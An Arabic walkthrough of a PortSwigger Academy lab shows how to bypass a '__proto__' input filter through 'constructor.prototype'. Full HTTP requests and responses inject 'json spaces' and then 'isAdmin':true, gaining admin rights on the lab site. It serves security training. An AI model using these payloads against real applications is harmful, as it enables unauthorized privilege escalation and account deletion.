# [Bypassing flawed input filters for server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution)

## **`الهدف`**
قم بالعثور على مصدر يمكنك استخدامه لإضافة خصائص عشوائية إلى `Object.prototype`، ثم قم بتحديد خاصية من خصائص الأداة `Gadget` التي تسمح لك برفع الصلاحيات، ثم قم بالدخول إلى لوحة التحكم وحذف حساب `Carlos`.
## **`خطوات الحل`**
**`ملاحظة هامة:`** يمكن حل هذا اللاب عن طريق`Status code override` أو `JSON spaces override` أو `Charset override` ولكني سأستعمل الطريقة الثانية هنا.

سنقوم بتسجيل الدخول إلى حساب `wiener:peter` وبعد ذلك سنقوم بتغيير أى جزء من الـ `Billing and Delivery Address` ونضغط `Submit` وبعد ذلك سنقوم بالعثور على الطلب الخاص بهذا الجزء في `HTTP history` ونقوم بتحويله إلى `Repeater`
```http
POST /my-account/change-address HTTP/2
Host: 0afa009a0350e0068031ada300290016.web-security-academy.net
Cookie: session=vIIF0VX4NubfwLwNl7h44pdrnkLs9WTo

{"address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"vIIF0VX4NubfwLwNl7h44pdrnkLs9WTo"}
```

وعند فحص الاستجابة سنجد أن السيرفر يرد بـ `JSON` يمثل المستخدم الخاص بنا.
```http
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"c0-wwwycOX3bwcfudlvhgc2EcxaN4Y"
Date: Tue, 03 Nov 2026 04:06:35 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 192

{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":false}
```

بعد ذلك سنقوم بتعديل الطلب عن طريق وضع خاصية جديدة في `JSON` باسم `__proto__`
```http
POST /my-account/change-address HTTP/2
Host: 0afa009a0350e0068031ada300290016.web-security-academy.net
Cookie: session=vIIF0VX4NubfwLwNl7h44pdrnkLs9WTo

{"address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"vIIF0VX4NubfwLwNl7h44pdrnkLs9WTo",
"__proto__": {
    "json spaces":10
}}
```

ولكن عند فحص الاستجابة من داخل تاب `Raw` لن نلاحظ وجود تأثير على الـ `JSON indentation`
```http
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"c0-wwwycOX3bwcfudlvhgc2EcxaN4Y"
Date: Tue, 03 Nov 2026 04:07:20 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 192

{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":false}
```

وبعد ذلك سنقوم بإستعمال خاصية `constructor`
```http
POST /my-account/change-address HTTP/2
Host: 0afa009a0350e0068031ada300290016.web-security-academy.net
Cookie: session=vIIF0VX4NubfwLwNl7h44pdrnkLs9WTo

{"address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"vIIF0VX4NubfwLwNl7h44pdrnkLs9WTo",
"constructor": {
    "prototype": {
        "json spaces":10
    }
}}
```

وعند فحص الاستجابة من داخل تاب `Raw` سنلاحظ وجود تأثير على الـ `JSON indentation`
```http
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"14a-PRaVsNwpoZICxQ9kxfSmoId3vD4"
Date: Tue, 03 Nov 2026 04:07:49 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 330

{
          "username": "wiener",
          "firstname": "Peter",
          "lastname": "Wiener",
          "address_line_1": "TEST",
          "address_line_2": "One Wiener Way",
          "city": "Wienerville",
          "postcode": "BU1 1RP",
          "country": "UK",
          "isAdmin": false,
          "json spaces": 10
}
```

بعد ذلك سنقوم بتعديل الطلب عن طريق وضع خاصية `isAdmin` بقيمة `true` داخل خاصية `constructor`
```http
POST /my-account/change-address HTTP/2
Host: 0afa009a0350e0068031ada300290016.web-security-academy.net
Cookie: session=vIIF0VX4NubfwLwNl7h44pdrnkLs9WTo

{"address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"vIIF0VX4NubfwLwNl7h44pdrnkLs9WTo",
"constructor": {
    "prototype": {
        "isAdmin":true
    }
}}
```
وسنجد أن الاستجابة قد تم تحديث قيمة `isAdmin` بها
```http
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"149-ZVBU6GrZ8fT0+Y7Y+0TIzGg8vzQ"
Date: Tue, 03 Nov 2026 04:08:55 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 329

{
          "username": "wiener",
          "firstname": "Peter",
          "lastname": "Wiener",
          "address_line_1": "TEST",
          "address_line_2": "One Wiener Way",
          "city": "Wienerville",
          "postcode": "BU1 1RP",
          "country": "UK",
          "isAdmin": true,
          "json spaces": 10
}
```
وبعد ذلك سنقوم بالتوجه إلى المتصفح وندخل إلى لوحة التحكم ثم نقوم بحذف حساب `Carlos` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [Privilege escalation via server-side prototype pollution](./Privilege-escalation-via-server-side-prototype-pollution.md)
